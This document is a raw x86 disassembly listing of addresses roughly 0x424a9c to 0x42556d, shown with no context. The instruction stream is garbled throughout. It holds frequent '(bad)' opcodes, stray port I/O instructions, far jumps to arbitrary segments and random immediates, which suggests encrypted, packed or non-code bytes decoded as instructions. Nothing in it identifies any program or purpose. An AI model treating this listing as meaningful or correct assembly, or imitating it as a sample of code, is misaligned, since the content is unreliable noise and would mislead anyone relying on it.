  424a9c:	mov    al,ds:0x378b2ddb
  424aa1:	pusha  
  424aa2:	cmp    ebp,DWORD PTR [edi+eax*4-0x1351798d]
  424aa9:	jne    0x424b1c
  424aab:	(bad)  
  424aac:	push   ebp
  424aad:	das    
  424aae:	mov    cl,0x93
  424ab0:	and    BYTE PTR [edi-0x3],dl
  424ab3:	mov    ch,0x6d
  424ab5:	mov    bl,0x80
  424ab7:	(bad)  
  424ab8:	in     al,dx
  424ab9:	dec    eax
  424aba:	mov    al,ds:0x44c4c80d
  424abf:	jb     0x424ac0
  424ac1:	aad    0x47
  424ac3:	mov    edi,0x82316ca7
  424ac8:	xchg   esi,eax
  424ac9:	jnp    0x424a89
  424acb:	in     al,0x19
  424acd:	sar    BYTE PTR [ebx+0x7683494c],1
  424ad3:	mov    bh,0x52
  424ad5:	mov    ?,edx
  424ad7:	data16 lods al,BYTE PTR ds:[esi]
  424ad9:	(bad)  
  424ada:	std    
  424adb:	rol    ebp,cl
  424add:	push   ss
  424ade:	retf   
  424adf:	sub    edx,0xffffffda
  424ae2:	popf   
  424ae3:	mov    esp,ds
  424ae5:	xchg   ebx,eax
  424ae6:	dec    edx
  424ae7:	sub    DWORD PTR [edi+0x9],eax
  424aea:	retf   0x90e3
  424aed:	popf   
  424aee:	shr    BYTE PTR [ebx],1
  424af0:	lods   al,BYTE PTR ds:[esi]
  424af1:	rol    DWORD PTR [ecx],cl
  424af3:	push   eax
  424af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424af5:	adc    al,0x47
  424af7:	ror    DWORD PTR [ebx-0x10b8b78a],1
  424afd:	pop    edx
  424afe:	mov    cl,0x49
  424b00:	sub    ebp,DWORD PTR [esi+0x20]
  424b03:	cld    
  424b04:	xchg   edx,eax
  424b05:	fld    DWORD PTR [ecx+eax*1-0x76381420]
  424b0c:	and    eax,0x91d9ba57
  424b11:	pop    eax
  424b12:	lahf   
  424b13:	jno    0x424b82
  424b15:	inc    eax
  424b16:	outs   dx,BYTE PTR ds:[esi]
  424b17:	mov    al,es:0xf509cd93
  424b1d:	or     al,0xd2
  424b1f:	popf   
  424b20:	sbb    eax,0xf2a7b751
  424b25:	retf   
  424b26:	and    eax,0xa8e5f490
  424b2b:	sub    DWORD PTR [edx],ebp
  424b2d:	pop    esi
  424b2e:	mov    al,ds:0x264ae956
  424b33:	popf   
  424b34:	stos   DWORD PTR es:[edi],eax
  424b35:	ins    BYTE PTR es:[edi],dx
  424b36:	lds    edx,FWORD PTR [esi+0x690e6d89]
  424b3c:	cdq    
  424b3d:	lahf   
  424b3e:	repz or DWORD PTR [edi-0x5],0x37873873
  424b46:	sahf   
  424b47:	ds test al,0x86
  424b4a:	push   ebp
  424b4b:	adc    cl,BYTE PTR [edx+edx*8-0x60]
  424b4f:	xchg   edi,eax
  424b50:	cwde   
  424b51:	gs xchg esi,eax
  424b53:	xor    eax,0x3c11aa02
  424b58:	cmp    bh,ch
  424b5a:	lock js 0x424bb4
  424b5d:	mov    bh,0xec
  424b5f:	mov    edx,0x5111fd76
  424b64:	inc    edi
  424b65:	xchg   DWORD PTR [edx-0x42],ebx
  424b68:	mov    esi,0x75191dc3
	...
  424bd5:	add    BYTE PTR [esi],al
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	inc    eax
  424be3:	mov    edi,0x89b4b99a
  424be8:	add    DWORD PTR [eax],eax
  424bea:	inc    DWORD PTR [eax]
  424bec:	add    BYTE PTR [eax],al
  424bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bef:	in     al,0x7f
  424bf1:	test   al,0xaf
  424bf3:	add    DWORD PTR [eax+0x40],esi
  424bf6:	cmp    al,0x9d
  424bf8:	sub    DWORD PTR [eax+0x16034f9b],esi
  424bfe:	not    DWORD PTR ss:[eax]
  424c01:	dec    eax
  424c02:	push   DWORD PTR [edi+0x4075e046]
  424c08:	mov    ds:0x97ae164d,eax
  424c0d:	in     eax,0x32
  424c0f:	mov    ebx,0xd10217a9
  424c14:	add    ebx,DWORD PTR [eax+0x284f1a7f]
  424c1a:	scas   eax,DWORD PTR es:[edi]
  424c1b:	mov    ebp,0xe12454a
  424c20:	ror    DWORD PTR [esi],cl
  424c22:	pop    eax
  424c23:	iret   
  424c24:	lods   al,BYTE PTR ds:[esi]
  424c25:	xor    BYTE PTR [eax+0x22],al
  424c28:	pop    ss
  424c29:	sub    eax,0x5331440
  424c2e:	mov    ecx,0x66ba2358
  424c33:	and    DWORD PTR [ebp+0x586cda4e],0x74
  424c3a:	inc    edi
  424c3b:	adc    al,0x5
  424c3d:	popa   
  424c3e:	mov    dl,0x2a
  424c40:	push   esp
  424c41:	dec    edi
  424c42:	ss (bad) 
  424c44:	xchg   esp,eax
  424c45:	aas    
  424c46:	push   ss
  424c47:	cdq    
  424c48:	dec    edi
  424c49:	sbb    al,0x10
  424c4b:	sub    al,0x3a
  424c4d:	std    
  424c4e:	cmp    BYTE PTR [ecx-0xa],cl
  424c51:	sub    edx,DWORD PTR [ebp-0x39871eb3]
  424c57:	dec    ebx
  424c58:	ret    0xa6e5
  424c5b:	fisub  DWORD PTR [eax+0x11]
  424c5e:	dec    eax
  424c5f:	les    ecx,FWORD PTR [ebx]
  424c61:	iret   
  424c62:	mov    al,0xae
  424c64:	xchg   edx,eax
  424c65:	add    al,bl
  424c67:	jecxz  0x424c98
  424c69:	repz add eax,0x206da2d7
  424c6f:	lock dec eax
  424c71:	cli    
  424c72:	jmp    0xc6528731
  424c77:	jecxz  0x424c38
  424c79:	inc    eax
  424c7a:	sub    ebx,DWORD PTR [esi-0x6295bf97]
  424c80:	xor    BYTE PTR [edx*8-0x9f3e2fe],bh
  424c87:	add    al,0x3e
  424c89:	jge    0x424cff
  424c8b:	cmc    
  424c8c:	fstp   TBYTE PTR [ebx]
  424c8e:	mov    dh,0x96
  424c90:	dec    esi
  424c91:	test   DWORD PTR [esi],0xf2c0d50e
  424c97:	inc    ebp
  424c98:	rcr    DWORD PTR [ecx],0x5c
  424c9b:	jmp    0xdb4b:0x1cf57e85
  424ca2:	imul   esp,DWORD PTR [ebp+0x4e265901],0x17026752
  424cac:	dec    esp
  424cad:	and    eax,0x5fb3c4d3
  424cb2:	outs   dx,BYTE PTR ds:[esi]
  424cb3:	inc    ecx
  424cb4:	imul   edx,DWORD PTR [edi+0x498e0757],0x2d
  424cbb:	les    edi,FWORD PTR [ecx+0x63048ee0]
  424cc1:	popa   
  424cc2:	adc    DWORD PTR [edi],0xba817b4e
  424cc8:	jecxz  0x424cc9
  424cca:	xchg   edx,eax
  424ccb:	jle    0x424cae
  424ccd:	or     ebp,DWORD PTR [edx+0x721f3f3c]
  424cd3:	inc    ebx
  424cd4:	xchg   ecx,eax
  424cd5:	pop    es
  424cd6:	retf   0xf7fc
  424cd9:	cmc    
  424cda:	pop    ecx
  424cdb:	pop    esi
  424cdc:	and    al,0xc4
  424cde:	jle    0x424d1b
  424ce0:	popa   
  424ce1:	lds    edi,FWORD PTR ds:0xd42e68b6
  424ce7:	or     eax,esi
  424ce9:	mov    cl,0xc
  424ceb:	mov    ds:0x5c,eax
	...
  424d54:	add    BYTE PTR [eax],al
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx-0x2134ae58]
  424d64:	call   0x1cd008b
  424d69:	add    bh,bh
  424d6b:	add    BYTE PTR [eax],al
  424d6d:	add    dh,bh
  424d6f:	jecxz  0x424d0d
  424d71:	mov    eax,ds:0x3e51a13b
  424d76:	jmp    0x424d70
  424d78:	pop    ds
  424d79:	ficom  DWORD PTR [eax+ecx*1]
  424d7c:	fwait
  424d7d:	mov    cl,0x90
  424d7f:	in     al,0x76
  424d81:	mov    ds:0xc14299ba,eax
  424d86:	adc    eax,0xce4498f
  424d8b:	and    eax,DWORD PTR [esi+edi*8+0x37fac4c0]
  424d92:	sub    al,0xc
  424d94:	out    dx,eax
  424d95:	into   
  424d96:	shr    BYTE PTR [esi+0x5d],0xd2
  424d9a:	pusha  
  424d9b:	fild   QWORD PTR [edi]
  424d9d:	xchg   DWORD PTR [ebp-0x2d566321],esi
  424da3:	clc    
  424da4:	out    0xac,al
  424da6:	or     edi,DWORD PTR [ebx]
  424da8:	jno    0x424d63
  424daa:	inc    ecx
  424dab:	ss (bad) 
  424dae:	sub    BYTE PTR [ecx],dh
  424db0:	mov    eax,ds:0xa67a61b8
  424db5:	cld    
  424db6:	imul   edx,DWORD PTR [ecx+0x6df0d227],0x6c
  424dbd:	xor    ebx,DWORD PTR [ebp+0x45]
  424dc0:	into   
  424dc1:	test   eax,0x1a6681a6
  424dc6:	les    edx,FWORD PTR [ecx+0x217a6fbc]
  424dcc:	sub    DWORD PTR [ebx+0x42b9a690],esi
  424dd2:	push   esi
  424dd3:	lea    ebx,[ebp+0x17]
  424dd6:	sbb    al,0x98
  424dd8:	jl     0x424dc7
  424dda:	inc    edx
  424ddb:	pop    es
  424ddc:	xor    esi,DWORD PTR [eax-0x6785491d]
  424de2:	inc    BYTE PTR [edx+esi*2]
  424de5:	ss mov edi,0x7d3b3433
  424deb:	inc    ebp
  424dec:	mov    esp,0x88142258
  424df1:	std    
  424df2:	cmp    DWORD PTR [esi+0x2],ebp
  424df5:	mov    eax,ds:0xfcba95b5
  424dfa:	mov    dl,BYTE PTR [esi+0x6f]
  424dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dfe:	ins    DWORD PTR es:[edi],dx
  424dff:	pop    eax
  424e00:	xor    DWORD PTR [edi+0x17],0xb3f9df6d
  424e07:	or     al,ah
  424e09:	shl    dh,cl
  424e0b:	xor    ecx,DWORD PTR [esi+0x37]
  424e0e:	(bad)
  424e12:	shr    BYTE PTR [esi+0x1b],cl
  424e15:	push   edx
  424e16:	cdq    
  424e17:	jne    0x424e29
  424e19:	rcl    esi,0x4f
  424e1c:	outs   dx,DWORD PTR ds:[esi]
  424e1d:	mov    cl,0x7b
  424e1f:	outs   dx,DWORD PTR ds:[esi]
  424e20:	mov    bh,0x6f
  424e22:	mov    al,ds:0x234df188
  424e27:	xchg   edi,eax
  424e28:	mov    ds:0xa46d8d19,al
  424e2d:	in     al,0x45
  424e2f:	xchg   esp,eax
  424e30:	outs   dx,BYTE PTR ds:[esi]
  424e31:	aam    0x53
  424e33:	adc    ah,0x9b
  424e36:	outs   dx,DWORD PTR ds:[esi]
  424e37:	lock aad 0xf2
  424e3a:	push   eax
  424e3b:	lds    esp,FWORD PTR [ecx+0x39]
  424e3e:	and    ebx,DWORD PTR [edi+0x61b54a8]
  424e44:	call   0xe2cc:0xcfd6b01c
  424e4b:	and    BYTE PTR [ebx+ebx*4],ch
  424e4e:	lods   al,BYTE PTR ds:[esi]
  424e4f:	xor    edx,DWORD PTR [ecx+0x2aec64b5]
  424e55:	xchg   edi,eax
  424e56:	mov    eax,0x80899e40
  424e5b:	xor    DWORD PTR [ecx],eax
  424e5d:	stc    
  424e5e:	sub    eax,0x93a5dcf2
  424e63:	punpckhwd mm1,QWORD PTR [esi+ecx*1+0x32]
  424e68:	test   BYTE PTR [edi],bh
  424e6a:	dec    ecx
  424e6b:	inc    eax
  424e6c:	and    BYTE PTR [eax],al
	...
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424e8a
  424ee3:	out    dx,al
  424ee4:	mov    esp,0x18bb2e8
  424ee9:	add    bh,bh
  424eeb:	add    BYTE PTR [eax],al
  424eed:	add    BYTE PTR [edx],cl
  424eef:	cmp    dl,BYTE PTR [ebp-0x4fb10cc9]
  424ef5:	lahf   
  424ef6:	sti    
  424ef7:	jbe    0x424f48
  424ef9:	mov    ebp,0xaa4aec55
  424efe:	es mov esi,0xd817cc72
  424f04:	int3   
  424f05:	and    al,0x4b
  424f07:	(bad)  
  424f09:	push   eax
  424f0a:	dec    edi
  424f0b:	lods   al,BYTE PTR ds:[esi]
  424f0c:	fldenv [ebx-0xd33ea02]
  424f12:	les    ebp,FWORD PTR [edi]
  424f14:	aam    0x3a
  424f16:	pop    ss
  424f17:	loop   0x424f31
  424f19:	cmp    al,0xa6
  424f1b:	int3   
  424f1c:	(bad)  [ebp+0x6c]
  424f1f:	cli    
  424f20:	adc    BYTE PTR [eax+0x26],bh
  424f23:	ins    BYTE PTR es:[edi],dx
  424f24:	mov    ah,0x6a
  424f26:	outs   dx,BYTE PTR ds:[esi]
  424f27:	lea    ebp,ds:0x5ed59a6c
  424f2d:	pop    esi
  424f2e:	aam    0xf
  424f30:	cmp    BYTE PTR [esi-0x43baf60a],ah
  424f36:	fsub   QWORD PTR [esi]
  424f38:	xor    ebx,esp
  424f3a:	arpl   dx,sp
  424f3c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  424f3e:	nop
  424f3f:	pop    ebp
  424f40:	xlat   BYTE PTR ds:[ebx]
  424f41:	pop    ecx
  424f42:	out    0x6f,eax
  424f44:	mov    ch,0x15
  424f46:	imul   BYTE PTR [ecx]
  424f48:	xchg   BYTE PTR [ebx+0x58cfd2d4],bl
  424f4e:	loope  0x424f90
  424f50:	fisttp QWORD PTR [eax-0x42885842]
  424f56:	push   ds
  424f57:	pop    edi
  424f58:	adc    ah,BYTE PTR [edx-0x4d]
  424f5b:	not    edi
  424f5d:	fldcw  WORD PTR [eax+0x1b]
  424f60:	nop
  424f61:	addr16 sub eax,ebx
  424f64:	xchg   DWORD PTR [esi-0xa55a491],edx
  424f6a:	rcl    BYTE PTR [edi+edx*4],cl
  424f6d:	jmp    0xfe61a1e9
  424f72:	mov    ebx,0xc315f259
  424f77:	mov    bh,0xd2
  424f79:	push   esi
  424f7a:	xlat   BYTE PTR ds:[ebx]
  424f7b:	inc    esi
  424f7c:	adc    eax,0x100689ca
  424f81:	push   es
  424f82:	sbb    BYTE PTR [ebx+0x4],bh
  424f85:	lods   eax,DWORD PTR ds:[esi]
  424f86:	jl     0x424faf
  424f88:	mov    eax,ds:0xed8cab6c
  424f8d:	cmpps  xmm7,XMMWORD PTR [edi+eax*8],0x19
  424f92:	cdq    
  424f93:	inc    eax
  424f94:	mov    edx,DWORD PTR [ebx*8-0x619aa759]
  424f9b:	ins    DWORD PTR es:[edi],dx
  424f9c:	vsubpd ymm2,ymm7,YMMWORD PTR [ebp+0x26]
  424fa1:	imul   ebp,ecx,0xffffff9c
  424fa4:	cmp    eax,0x794848fc
  424fa9:	(bad)  
  424faa:	loopne 0x424ff3
  424fac:	pusha  
  424fad:	cwde   
  424fae:	mov    WORD PTR [ebx+edx*1-0x4c],ss
  424fb2:	and    al,0x35
  424fb4:	adc    edx,DWORD PTR [ecx]
  424fb6:	fisttp QWORD PTR [ecx]
  424fb8:	add    BYTE PTR [eax+0x4c8ed209],bl
  424fbe:	xor    eax,0x226a4cb8
  424fc3:	push   esp
  424fc4:	mov    al,0xdc
  424fc6:	imul   esp,DWORD PTR [ebx+0x1c9b643a],0x375b8d2e
  424fd0:	es ret 0xe4ca
  424fd4:	fs xchg ecx,eax
  424fd6:	data16 jg 0x424fb5
  424fd9:	cmc    
  424fda:	cld    
  424fdb:	call   0x21f7:0xd9ac00f5
  424fe2:	dec    ebx
  424fe3:	xchg   esp,eax
  424fe4:	mov    bh,0xc4
  424fe6:	cs jns 0x42502a
  424fe9:	cmp    ebx,eax
  424feb:	inc    edx
  424fec:	bound  eax,QWORD PTR [eax]
	...
  425056:	dec    ebx
  425057:	push   ss
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	mov    dl,BYTE PTR [ecx+0x7e]
  425065:	add    dh,BYTE PTR [ecx-0xfffe74]
  42506b:	add    BYTE PTR [eax],al
  42506d:	add    BYTE PTR [esi-0x66a4b874],al
  425073:	test   eax,0xb8f51a67
  425078:	sbb    BYTE PTR [edi+0x2],ch
  42507b:	xchg   ebp,eax
  42507c:	imul   esi,DWORD PTR [ebp+0x13],0x1e466dd5
  425083:	xchg   edi,eax
  425084:	jg     0x42505c
  425086:	pop    edi
  425087:	xor    DWORD PTR [esi-0x178929b2],edx
  42508d:	mov    DWORD PTR [ecx],ecx
  42508f:	and    DWORD PTR [esp+ebp*8-0x49f8133b],edx
  425096:	or     BYTE PTR [edi-0x37],bh
  425099:	jne    0x42507d
  42509b:	mov    ch,0x37
  42509d:	adc    eax,0x66231746
  4250a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250a3:	call   0xc44a3b11
  4250a8:	or     BYTE PTR [edx*8-0x7f7f20f8],bl
  4250af:	or     al,0x25
  4250b2:	add    BYTE PTR [edx+0x38820cd5],0xc1
  4250b9:	call   0x9bd036fd
  4250be:	mov    dl,bl
  4250c0:	adc    eax,DWORD PTR ds:0x61e8410b
  4250c6:	packssdw mm3,QWORD PTR [edi+0x18]
  4250ca:	outs   dx,DWORD PTR ds:[esi]
  4250cb:	out    dx,al
  4250cc:	out    0xab,eax
  4250ce:	mov    ebx,0xc0c9d5a0
  4250d3:	nop
  4250d4:	push   0xffffffb2
  4250d6:	and    ebx,ebx
  4250d8:	in     eax,0xb1
  4250da:	adc    ebp,DWORD PTR [esi]
  4250dc:	mov    edi,0xd6da8b7e
  4250e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250e2:	add    eax,0x77031dd1
  4250e7:	inc    eax
  4250e8:	push   ebx
  4250e9:	daa    
  4250ea:	adc    ebp,edx
  4250ec:	pop    es
  4250ed:	sbb    eax,0x32e58f
  4250f2:	int3   
  4250f3:	fs sub bl,cl
  4250f6:	add    eax,0xbfbc6fb9
  4250fb:	(bad)  
  4250fc:	shr    BYTE PTR [ecx-0x60f420ee],cl
  425102:	cs and bl,dh
  425105:	cdq    
  425106:	stos   DWORD PTR es:[edi],eax
  425107:	sub    ebx,DWORD PTR [ebp+0x31]
  42510a:	loope  0x42510e
  42510c:	retw   
  42510e:	pushf  
  42510f:	jae    0x42513d
  425111:	outs   dx,BYTE PTR ds:[esi]
  425112:	ret    
  425113:	adc    BYTE PTR [ecx],al
  425115:	ds fcom st(3)
  425118:	mov    ds:0xc0ea9290,al
  42511d:	arpl   WORD PTR [esi+0x77],dx
  425120:	mov    cl,0x2a
  425122:	ffreep st(5)
  425124:	pop    ss
  425125:	pop    edi
  425126:	test   DWORD PTR [ebx+0x53],0xce239cb0
  42512d:	rcl    BYTE PTR [eax*4-0x2b1829a8],1
  425134:	xchg   edx,eax
  425135:	inc    esp
  425136:	push   esp
  425137:	xor    ah,BYTE PTR [ecx+eiz*2-0x72]
  42513b:	mov    bh,0xed
  42513d:	mov    edx,0xffe8916a
  425142:	es push 0xa0faaf2d
  425148:	(bad)  
  425149:	stc    
  42514a:	pop    es
  42514b:	cs aaa 
  42514d:	iret   
  42514e:	popa   
  42514f:	push   ecx
  425150:	cmp    ch,al
  425152:	retf   0xd1d3
  425155:	push   eax
  425157:	repnz push esp
  425159:	ret    
  42515a:	inc    ebx
  42515b:	daa    
  42515c:	fcomp  QWORD PTR [esi]
  42515e:	xchg   ebp,eax
  42515f:	jb     0x425180
  425161:	adc    ebx,ebp
  425163:	inc    esi
  425164:	inc    ebp
  425165:	jae    0x42517f
  425167:	imul   ebp,DWORD PTR [ebx+0x16],0x50
  42516b:	sbb    edx,DWORD PTR [ebp+0x0]
	...
  4251d5:	add    dh,bl
  4251d7:	adc    DWORD PTR [edi-0x15020dd],ebx
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0xa9c5:0x435d92e8
  4251e6:	mov    al,0x8d
  4251e8:	add    DWORD PTR [eax],eax
  4251ea:	inc    DWORD PTR [eax]
  4251ec:	add    BYTE PTR [eax],al
  4251ee:	test   DWORD PTR [ebx-0x47],edx
  4251f1:	cmp    BYTE PTR [edi],bh
  4251f3:	add    al,BYTE PTR [eax+0x62da196f]
  4251f9:	cs dec esi
  4251fb:	stos   DWORD PTR es:[edi],eax
  4251fc:	cmp    edx,DWORD PTR [eax-0x4a516c80]
  425202:	dec    esp
  425203:	inc    esp
  425204:	and    al,0x1d
  425206:	mov    bl,ch
  425208:	push   edi
  425209:	adc    edi,ecx
  42520b:	scas   eax,DWORD PTR es:[edi]
  42520c:	xor    al,BYTE PTR [ecx+0x407a7f47]
  425212:	ins    DWORD PTR es:[edi],dx
  425213:	scas   eax,DWORD PTR es:[edi]
  425214:	adc    DWORD PTR [edx],edi
  425216:	mov    eax,DWORD PTR [ecx-0x74c578c4]
  42521c:	sbb    al,0x73
  42521e:	ret    0xda0c
  425221:	imul   ebp,DWORD PTR [ebx+0x5b],0xe8aacc99
  425228:	pop    ss
  425229:	mov    ebp,DWORD PTR [esi+0x50]
  42522c:	dec    ecx
  42522d:	cmp    ebp,DWORD PTR [eax-0x3090d718]
  425233:	or     BYTE PTR [ebx+ebp*8-0x6a],cl
  425237:	push   ebx
  425238:	in     al,dx
  425239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42523a:	jp     0x425257
  42523c:	retf   0x8d5e
  42523f:	sti    
  425240:	sub    eax,0xbb69ba69
  425245:	fisttp WORD PTR [esi+0x45]
  425248:	scas   eax,DWORD PTR es:[edi]
  425249:	mov    ah,0xef
  42524b:	call   0x571b:0x13b13115
  425252:	sub    DWORD PTR [eax-0x2b7305b9],ecx
  425258:	cmp    edi,DWORD PTR [esi-0x22]
  42525b:	add    eax,DWORD PTR [edx-0x18]
  42525e:	data16 je 0x4251fb
  425261:	mov    cl,0xa0
  425263:	mov    al,ds:0xc1ee6347
  425268:	mov    bh,BYTE PTR [edx-0x45b0a801]
  42526e:	pop    esi
  42526f:	push   ebx
  425270:	sbb    al,0xd7
  425272:	add    dh,BYTE PTR [edx-0x2f51386a]
  425278:	lock jbe 0x425278
  42527b:	js     0x425290
  42527d:	(bad)  
  42527f:	dec    eax
  425280:	retf   
  425281:	call   0xe44e:0x121bc91e
  425288:	sub    ch,BYTE PTR [edi-0x44]
  42528b:	or     ebx,DWORD PTR [edi+0x4c2cfaae]
  425291:	pop    eax
  425292:	loope  0x4252d7
  425294:	test   BYTE PTR [ebp+0x32f8c7a2],ch
  42529a:	fdivr  QWORD PTR [ecx-0x48916eb8]
  4252a0:	jne    0x4252ea
  4252a2:	dec    esi
  4252a3:	es push 0xfffffff8
  4252a6:	clc    
  4252a7:	push   ss
  4252a8:	daa    
  4252a9:	mov    al,ds:0xf8c809e1
  4252ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252af:	cmp    eax,0x2170ceb6
  4252b4:	cs inc ecx
  4252b6:	cmp    BYTE PTR [esi-0x202f4523],0x31
  4252bd:	adc    al,0xb7
  4252bf:	mov    bh,0xf8
  4252c1:	scas   al,BYTE PTR es:[edi]
  4252c2:	cmp    bh,BYTE PTR [ecx]
  4252c4:	scas   eax,DWORD PTR es:[edi]
  4252c5:	out    0x95,al
  4252c7:	aaa    
  4252c8:	repz xchg edi,eax
  4252ca:	das    
  4252cb:	mov    DWORD PTR [ebp+0x6d65476e],edi
  4252d1:	ror    DWORD PTR [eax-0x7],0x91
  4252d5:	xor    esp,DWORD PTR [esi+0x39]
  4252d8:	data16 cld 
  4252da:	xchg   ecx,eax
  4252db:	xchg   ecx,eax
  4252dc:	jns    0x425274
  4252de:	rol    BYTE PTR [esi+0x48],1
  4252e1:	push   DWORD PTR [edx-0x7]
  4252e4:	sbb    cl,BYTE PTR [esi+0x1b]
  4252e7:	int3   
  4252e8:	fimul  WORD PTR [esi+0xaf5616]
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	jns    0x425395
  425364:	pop    edx
  425365:	(bad)  
  425366:	scas   eax,DWORD PTR es:[edi]
  425367:	mov    es,WORD PTR [ecx]
  425369:	add    bh,bh
  42536b:	add    BYTE PTR [eax],al
  42536d:	add    BYTE PTR [ebp-0x1f],ch
  425370:	or     DWORD PTR [esp+edi*1-0x49b70a45],edi
  425377:	mov    DWORD PTR [edx-0x128c825e],ebp
  42537d:	mov    bh,0x44
  42537f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425380:	int3   
  425381:	call   0x7e5d0a12
  425386:	jge    0x4253d2
  425388:	mov    ecx,0x7e97ecea
  42538d:	imul   edx,DWORD PTR ds:0xf1406ad2,0x33
  425394:	jns    0x4253e3
  425396:	ja     0x425413
  425398:	push   0xffffffd9
  42539a:	push   0x3f
  42539c:	xor    BYTE PTR [edx],cl
  42539e:	jnp    0x425358
  4253a0:	popa   
  4253a1:	jl     0x425410
  4253a3:	cmp    DWORD PTR [ebx-0x21040ca5],eax
  4253a9:	xor    al,0x71
  4253ab:	pop    eax
  4253ac:	add    dl,ch
  4253ae:	or     BYTE PTR [edx+0xf863106],bh
  4253b4:	pop    ss
  4253b5:	(bad)  [edi]
  4253b7:	idiv   DWORD PTR [eax+ebp*4]
  4253ba:	lods   al,BYTE PTR ds:[esi]
  4253bb:	into   
  4253bc:	mov    edx,0xdb71d325
  4253c1:	mov    esi,0x4bab0323
  4253c6:	mov    esp,0x8b9aba95
  4253cb:	fmul   QWORD PTR [edx-0x5fe8879f]
  4253d1:	add    eax,0x46a5f435
  4253d6:	mov    ds:0x6ce56bf2,al
  4253db:	xor    al,0x74
  4253dd:	jae    0x4253b5
  4253df:	aam    0x3f
  4253e1:	int    0xdd
  4253e3:	mov    eax,0x13a382ba
  4253e8:	sbb    BYTE PTR [edi],dh
  4253ea:	ret    
  4253eb:	pop    ds
  4253ec:	cmp    DWORD PTR [ecx-0x55],esi
  4253ef:	push   edx
  4253f0:	je     0x4253df
  4253f2:	jmp    0xbcfb:0x3c2adcde
  4253f9:	mov    eax,ds:0x7cb0c2fa
  4253fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253ff:	imul   DWORD PTR [edi-0x2aed2c13]
  425405:	pop    esi
  425406:	fisttp WORD PTR [ebp-0x2a]
  425409:	dec    dl
  42540b:	mov    esp,0xae655041
  425410:	mov    esi,0xe6aeab9d
  425415:	fistp  WORD PTR [eax]
  425417:	sub    eax,0xb1dfbcf1
  42541c:	shl    DWORD PTR [eax-0x567bf380],1
  425422:	or     al,ah
  425424:	or     ch,dh
  425426:	data16 int3 
  425428:	pop    es
  425429:	in     al,0x91
  42542b:	ins    DWORD PTR es:[edi],dx
  42542c:	or     eax,0x98098fef
  425431:	add    ch,BYTE PTR [ebx-0x11]
  425434:	cmp    DWORD PTR [edx-0x1e1bb89a],ebp
  42543a:	jmp    0x6e9f:0xee1f93f1
  425441:	xchg   ecx,eax
  425442:	push   ecx
  425443:	test   BYTE PTR [edx-0x57],0x12
  425447:	sub    eax,0x37b62ef6
  42544c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42544d:	sbb    bh,al
  42544f:	push   ds
  425450:	or     BYTE PTR [ebx-0x593039e3],bl
  425456:	jl     0x42543b
  425458:	mov    ecx,0xb98358cd
  42545d:	and    al,0x59
  42545f:	fldenv [edx-0x65cda680]
  425465:	push   0xd30f58ef
  42546a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42546b:	(bad)  
  42546c:	push   0x0
	...
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    ebp,DWORD PTR [ecx]
  4254e3:	jmp    0x425480
  4254e5:	xchg   esi,eax
  4254e6:	scas   al,BYTE PTR es:[edi]
  4254e7:	pop    DWORD PTR [ecx]
  4254e9:	add    bh,bh
  4254eb:	add    BYTE PTR [eax],al
  4254ed:	add    BYTE PTR [ecx+esi*2],ch
  4254f0:	mov    ecx,esi
  4254f2:	sahf   
  4254f3:	inc    ecx
  4254f4:	mov    esp,edx
  4254f6:	adc    DWORD PTR [ecx-0x6c],0xf5d0b8f7
  4254fd:	push   cs
  4254fe:	sub    BYTE PTR [ebp-0x24140c94],cl
  425504:	pop    es
  425505:	(bad)  
  425506:	dec    ebx
  425507:	fld    QWORD PTR [esi]
  425509:	rcr    ah,1
  42550b:	aam    0x5
  42550d:	ret    0xb2e5
  425510:	aas    
  425511:	std    
  425512:	jmp    0x42555d
  425514:	cmp    DWORD PTR [edi-0x15],0xfa72acbd
  42551b:	pop    ebp
  42551c:	sub    esp,DWORD PTR [ebx+0x6443949b]
  425522:	and    eax,0xe5c3edb7
  425527:	add    dh,BYTE PTR [ecx+0x42]
  42552a:	ss xchg ecx,eax
  42552c:	jle    0x425529
  42552e:	pop    esp
  42552f:	jo     0x42555c
  425531:	mov    eax,0xdd7972c1
  425536:	cmp    eax,0x54797137
  42553b:	mov    bh,0x62
  42553d:	pop    ss
  42553e:	out    dx,al
  42553f:	cmp    cl,cl
  425541:	outs   dx,DWORD PTR cs:[esi]
  425543:	mov    edi,0x297100ff
  425548:	ss pop edx
  42554a:	pushf  
  42554b:	xor    BYTE PTR [edx-0xf],dh
  42554e:	mov    BYTE PTR [ebx],cl
  425550:	jmp    0xae50:0xd87c127a
  425557:	inc    ebp
  425558:	enter  0xb780,0x22
  42555c:	bound  edi,QWORD PTR [eax+0x4b6b8d24]
  425562:	mov    dl,0x28
  425564:	(bad)  
  425565:	in     eax,0x11
  425567:	sub    eax,0x7135f05d
  42556c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42556d:	addr16 pop ebx
